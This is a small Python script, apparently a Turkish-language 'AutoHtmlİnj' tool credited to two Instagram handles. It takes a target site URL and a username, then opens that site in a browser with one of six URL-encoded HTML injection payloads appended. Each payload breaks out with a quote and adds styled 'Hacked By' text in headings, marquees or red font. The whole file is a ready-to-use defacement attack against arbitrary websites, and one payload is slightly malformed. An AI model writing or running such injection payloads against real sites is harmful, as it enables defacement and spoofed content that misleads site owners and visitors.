import time
import webbrowser
print("""================================
##############################
#        AutoHtmlİnj         #
#                            #
#   ===[ Jroken ]===         #
#                            #
#       ===[ ByTegn ]===     #
#                            #
##############################
İnstagram : hakoo28_
İnstagram : ozekk35
=================================""")
site = input('Siteyi Giriniz : ')
time.sleep(0.5)
print()
secenek1 = print('1-Sadece Kalın Yazı')
print()
secenek2 = print('2-Sadece kayan Yazı')
print()
secenek3 = print('3-Kayan + Kalın Yazı')
print()
secenek4 = print('4-Renkli Kalın Yazı')
print()
secenek4 = print('5-Renkli Kayan Yazı')
print()
secenek6 = print('6-Renkli Kalın + Kayan Yazı')
print()
time.sleep(0.4)
sorgu = int(input('==> '))
time.sleep(0.3)
username = input('İndexteki Adınız : ')
time.sleep(0.6)
print()
print("İndex Hazırlanıyor Lütfen Bekleyin")
time.sleep(1)
if (sorgu==1):
  webbrowser.open(f'{site}%27%3Ccenter%3E%3Cb%3E%3Ch1%3EHacked%20By%20{username}%3C/h1%3E%3C/b%3E%3C/center%3E')
  print()
if (sorgu==2):
  webbrowser.open(f'{site}%273Cmarquee%3EHacked%20By%20{username}%3C/marquee%3E')
  print()
if (sorgu==3):
  webbrowser.open(f'{site}%27%3Ccenter%3E%3Cb%3E%3Cmarquee%3EHacked%20By%20{username}%3C/marquee%3E%3Ch1%3EHacked%20By%20{username}%3C/h1%3E%3C/b%3E%3C/center%3E')
  print()
if (sorgu==4):
   webbrowser.open(f'{site}%27%3Ccenter%3E%3Cfont%20color=%22Red%22%3E%3Cb%3E%3Ch1%3EHacked%20By%20{username}%3C/h1%3E%3C/b%3E%3C/font%3E%3C/center%3E')
   print()
if (sorgu==5):
   webbrowser.open(f'{site}%27%3Cfont%20color=%22Red%22%3E%3Cb%3E%3Cmarquee%3EHacked%20By%20{username}%3C/marquee%3E%3C/b%3E%3C/font%3E')
   print()
if (sorgu==6):
   webbrowser.open(f'{site}%27%3Ccenter%3E%3Cfont%20color=%22Red%22%3E%3Cb%3E%3Cmarquee%3EHacked%20By%20{username}%3C/marquee%3E%3Ch1%3EHacked%20By%20{username}%3C/h1%3E%3C/b%3E%3C/font%3E%3C/center%3E')
   print()
